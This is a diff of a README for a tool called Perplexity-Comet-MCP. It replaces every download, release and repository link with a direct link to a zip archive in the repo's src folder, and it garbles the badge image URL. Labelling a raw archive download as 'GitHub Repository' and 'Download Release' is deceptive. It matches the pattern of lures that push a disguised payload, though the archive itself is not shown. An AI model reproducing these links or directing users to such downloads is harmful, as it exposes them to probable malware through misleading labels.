@@ -1,6 +1,6 @@
 # 🌌 Perplexity-Comet-MCP - Effortless Web Browsing and Research
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Perplexity--Comet--MCP-blue.svg)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/releases)
+[![Download Now](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip%https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ To run **Perplexity-Comet-MCP**, you need:
 
 To get started, you need to download the application. Visit the Releases page to download the version that suits your operating system.
 
-[Download Release](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/releases)
+[Download Release](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)
 
 Here are the steps to install the application:
 
@@ -66,8 +66,8 @@ If you encounter any issues, please check the FAQ section on the Releases page o
 
 You can learn more about the features, updates, and community feedback on our GitHub repository:
 
-[GitHub Repository](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP)
+[GitHub Repository](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)
 
 Feel free to explore the topics related to this project, such as `ai-agent`, `anthropic`, and `browser-automation`, to broaden your understanding and capability.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Perplexity--Comet--MCP-blue.svg)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/releases)
+[![Download Now](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip%https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)
